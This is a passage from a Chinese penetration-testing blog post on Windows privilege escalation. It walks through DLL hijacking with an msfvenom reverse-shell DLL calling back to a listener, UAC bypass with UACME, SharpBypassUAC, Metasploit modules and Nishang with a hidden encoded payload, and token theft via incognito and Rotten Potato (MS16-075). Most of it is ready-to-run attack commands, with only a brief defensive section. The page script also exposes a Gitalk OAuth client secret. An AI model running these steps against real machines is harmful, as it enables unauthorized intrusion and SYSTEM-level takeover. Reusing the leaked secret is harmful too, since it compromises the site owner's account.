+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功.</span><br><span class="line">1.通过火绒剑分析进程</span><br><span class="line">分析进程调用模块，找到可以利用的dll文件</span><br><span class="line">2.MSF生成后门dll木马</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.61.131 lport=8888 -f dll &gt; C:\Users\Ninja\D esktop\shell.dll</span><br><span class="line">3.上传替换</span><br><span class="line">4.MSF监听</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">use exploit/multi/handler</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">set</span> lhost xxx.xxx.xxx</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash"><span class="built_in">set</span> lport 8888</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">exploit</span></span><br><span class="line">等待程序运行，木马执行。</span><br><span class="line">5.配合令牌窃取进行提权</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">use incognito  （进入incognito模块）</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">list_tokens -u  （列出令牌）</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">impersonate_token <span class="string">&quot;NT AUTHORITY\\SYSTEM&quot;</span></span>  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ByPass 工具</span><br><span class="line">UACME https:<span class="comment">//github.com/hfiref0x/uacme</span></span><br><span class="line">UACME是一个专用于绕过uac的开源项目利用方式主要可以分为两大类:各类UAC白名单程序的DLL劫持(Dll Hijack)各类提升权限的COM接口利用(Elevated COM interface)</span><br><span class="line">在UACME项目中，每种绕过uac的方法都有一个数字编号，由一个名为Akagi.exe的主程序进行统一调用，命令如下</span><br><span class="line">Akagi<span class="selector-class">.exe</span> <span class="selector-attr">[key]</span> <span class="selector-attr">[Param]</span></span><br><span class="line"><span class="selector-id">#key</span> ，指定要使用的方法的编号</span><br><span class="line">#Parm，指定绕过UAC后要运行的程序或命令，默认启动一个关闭了uac的cmd窗口</span><br><span class="line"> 下面以<span class="number">23</span>号方法为例进行演示，该方法通过劫持白名单程序pkgmgr.exe所加载的DismCore.dll来绕过uac。 运行如下，即可弹出一个关闭了uac的命令窗口</span><br><span class="line">Akagi<span class="selector-class">.exe</span> <span class="number">23</span> c:\windows\system32\cmd<span class="selector-class">.exe</span></span><br><span class="line">cs插件SharpBypassUAC</span><br><span class="line">假设获取了一个加入了管理员组的用户test权限，由于不是administrator，权限还是非常有限，如添加用户和导出密码等操作都无法执行</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//3ab37c47539540dfaec524370e509adc.png" alt="img"></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">选祷杌的插件ByPass UAC之SharpBypassUAC，这里通过绕过uac然后再次执行beacon.exe，就能弹回一个高权限的<span class="keyword">shell</span><span class="language-bash">。对命令进行<span class="built_in">base64</span>编码，然后填入如下，点击run  </span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//40c4ccd18b4b84494210d8443fd76f0d.png" alt="img"></p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此时弹回的会话，虽然用户名还是一样，但是权限确多了很多  也能抓<span class="built_in">hash</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//05656afdec85c05eb7834d1f5322958c.png" alt="img"><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//4920b3fc758e57e9e42b03896075daf2.png" alt="img"></p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意，这个插件bypass uac后执行<span class="built_in">cmd</span>命令“<span class="built_in">cmd</span> lc命令”，是无回显的。所以这里选择运行攻击载荷来弹回一个高权限的会话。bypass uac一般用在非administrator管理员用户下进行权限提升，方法主要是通过劫持uac白名单程序所加载的dll文件进行提权</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MSF下的利用</span><br><span class="line">msf(bypassuac)模块</span><br><span class="line">MSF中Bypassuac模块的使用前提有两个：</span><br><span class="line"></span><br><span class="line">系统当前用户必须在管理员组中</span><br><span class="line"></span><br><span class="line">用户账户控制程序UAC设置为默认，即 “仅在程序试图更改我的计算机时通知我”</span><br><span class="line"></span><br><span class="line">use exploit/windows/<span class="keyword">local</span>/bypassuac  <span class="comment">#该模块运行时会因为在目标机上创建多个文件而被杀毒软件识别，因此通过该模块提权成功率很低。</span></span><br><span class="line">use exploit/windows/<span class="keyword">local</span>/bypassuac_injection  <span class="comment">#该模块直接运行在内存的反射DLL中，所以不会接触目标机器的硬盘，从而降低了被杀毒软件检测出来的概率。</span></span><br><span class="line"></span><br><span class="line"> use exploit/windows/<span class="keyword">local</span>/bypassuac</span><br><span class="line"><span class="keyword">set</span> session <span class="number">1</span></span><br><span class="line"><span class="keyword">set</span> lhost <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          </span><br><span class="line"><span class="keyword">set</span> lport <span class="number">24444</span>                <span class="comment">#本地监听的端口，随便设置一个未被占用的端口即可</span></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">msf中内置了几个用于绕过uac的模块</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//0772e43b36546ae53391f543eedbffba.png" alt="img"></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如使用eventvwr模块</span><br><span class="line"><span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/bypassuac_eventvwr</span><br><span class="line"><span class="keyword">set</span> lpor 5555</span><br><span class="line"><span class="keyword">set</span> session 2</span><br><span class="line"><span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//f129077a1957b17b15952f457bb2bb1f.png" alt="img"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接返回—个高权限的会话</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//2cd3196b837d0dc119c6a68553089684.png" alt="img"><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//9862da8be1e0a86cfb18068b9a81db5d.png" alt="img"></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">msf</span><span class="params">(ask)</span></span>模块</span><br><span class="line">使用 exploit/windows/local/ask 模块，需要使用 EXE::Custom 选项创建一个可执行文件(需要免杀)，目标机器会运行一个发起提升权限请求的程序，提示用户是否要继续运行，如果用户选择继续运行程序，就会返回一个高权限的shell。</span><br><span class="line"></span><br><span class="line">使用该模块的前提：</span><br><span class="line"></span><br><span class="line">当前用户必须在管理员组中 或 知道管理员的密码，对UAC的设置则没有要求。</span><br><span class="line"></span><br><span class="line">用户需要手动点击弹出的程序，是</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//7ed7075c19bbddb1e4d220da6fabb36b.png" alt="img"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Nishang中的<span class="built_in">Invoke-PsUACme</span>模块</span><br><span class="line"> </span><br><span class="line">//使用sysprep方法并执行默认的payload</span><br><span class="line"><span class="built_in">Invoke-PsUACme</span> <span class="literal">-Verbose</span></span><br><span class="line">//使用oobe方法并执行默认的payload</span><br><span class="line"><span class="built_in">Invoke-PsUACme</span> <span class="literal">-methed</span> oobe <span class="literal">-Verbose</span></span><br><span class="line">//使用oobe方法执行自定义的payload</span><br><span class="line"><span class="built_in">Invoke-PsUACme</span> <span class="literal">-methed</span> oobe <span class="literal">-Payload</span> <span class="string">&quot;powershell -windowstyle hidden -e &lt;your encoded payload&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">可以使用payloadpath参数指定payload的路径。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">针对绕过UAC提权的防御措施</span><br><span class="line">在企业网络环境中，防止绕过UAC的最好方法是不让内网机器的使用者拥有本地管理员权限，从而降低系统遭受攻击的可能性。</span><br><span class="line"></span><br><span class="line">使用本地管理员权限登录的用户，要将UAC设置为“始终通知”或者删除该用户的本地管理员权限(这样设置后，会像在Windows Vista中一样，总是弹出警告)。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="7-滥用高权限令牌提权"><a href="#7-滥用高权限令牌提权" class="headerlink" title="7.滥用高权限令牌提权"></a>7.滥用高权限令牌提权</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">令牌就相当于授权，在不需要密码的情况下访问资源。攻击者需要域管理员权限进行操作时就可以伪造管理员的令牌</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问令牌(Access <span class="built_in">Token</span>)：表示访问控制操作主体的系统对象</span><br><span class="line">会话令牌(Session <span class="built_in">Token</span>)：是交互会话中唯一的身份标识符。</span><br><span class="line">密保令牌(Security <span class="built_in">Token</span>)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在MSF中</span><br><span class="line">Delegation <span class="keyword">Token</span>：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</span><br><span class="line">Impresonation <span class="keyword">Token</span>：模拟令牌，它是非交互的会话。</span><br><span class="line">用MSF伪造令牌演示</span><br><span class="line"><span class="keyword">use</span> incognito</span><br><span class="line">list_tokens -<span class="keyword">u</span></span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//678380ac8e194c84c6e081749e5e4ace.png" alt="img"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//fa1f9a9bb9a422532c80e795ff9b7ab7.png" alt="img"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">烂土豆(Rotten Potato) MS16<span class="number">-075</span>提权是一个本地提权，只针对本地用户，不支持域用户</span><br><span class="line">通过欺骗 “NT AUTHORITY\<span class="keyword">SYSTEM</span>”账户通过NTLM认证到我们控制的TCP终端； 接着对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\<span class="keyword">SYSTEM</span>”账户本地协商一个安全令牌。 这个过程是通过一系列的Windows API调用实现的； 只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌 （一般大多数的服务型账户，例如：IIS、MSSQL…具有该权限，大多数用户级别的账户没有该权限）</span><br><span class="line"></span><br><span class="line">烂土豆提权需要具有“模仿安全令牌权限”。我们要先进行查看是否有这个权限</span><br><span class="line">查看是否具有Selmpersonate权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217161441399.png" alt="image-20241217161441399"></p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">过程：上传烂土豆-执行烂土豆-利用窃取模块-窃取 <span class="keyword">SYSTEM</span>-成功</span><br><span class="line">使用msf的ms16<span class="number">-075</span></span><br><span class="line">use exploit/windows/local/ms16_075_reflection</span><br><span class="line">show <span class="keyword">options</span></span><br><span class="line"><span class="keyword">set</span> session <span class="comment">1</span></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">或者  </span><br><span class="line">upload /root/<span class="comment">potato.exe C:\Users\Public</span></span><br><span class="line">cd <span class="comment">C:\\Users\\Public</span></span><br><span class="line">use <span class="comment">incognito</span></span><br><span class="line">list_tokens <span class="comment">-u</span></span><br><span class="line">execute <span class="comment">-cH -f .</span>/potato.exe</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="comment">&quot;NT AUTHORITY\\SYSTEM&quot;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">AD域是一种网络环境，它的核心是通过一个或多个域控制器<span class="comment">(DC)</span>来集中管理资源、身份认证<span class="comment">(通过Kerberos或NTLM协议)</span>，AD服务是用于方便管理该网络环境内的各种资源包括用户计算机，账户，打印机</span><br><span class="line">DC域是包含一个或者多个域控制器<span class="comment">(DC)</span>的域，域控制器<span class="comment">(DC)</span>是Active Directory中的关键组件,它负责提供身份验证、目录服务和其他管理功能。可以认为“DC域”即是一个运行并管理AD服务的环境。</span><br><span class="line"></span><br><span class="line">AD域和DC域通常是指同一个网络环境，只是从不同角度来描述。AD域是指域的管理结构，而DC域是强调在该域中有域控制器（DC）的实际运行环境。</span><br><span class="line">AD域通常表示域控制器所管理的逻辑结构，而DC域更多是指域中运行AD服务的主机（域控制器）及其运行的域环境。</span><br><span class="line">AD和DC的区别：</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217164043365.png" alt="image-20241217164043365"></p>
+<p><img src="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-windows%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86//image-20241217165159761-1734521418738-51.png" alt="image-20241217165159761"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="../tags/%E6%8F%90%E6%9D%83/"># 提权</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="../%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-linux%E6%8F%90%E6%9D%83%E6%A2%B3%E7%90%86/">内网渗透-Linux提权梳理</a>
+            
+            
+            <a class="next" rel="next" href="../ctf-%E5%88%B7%E5%AF%86%E7%A0%81/">CTF-刷密码</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
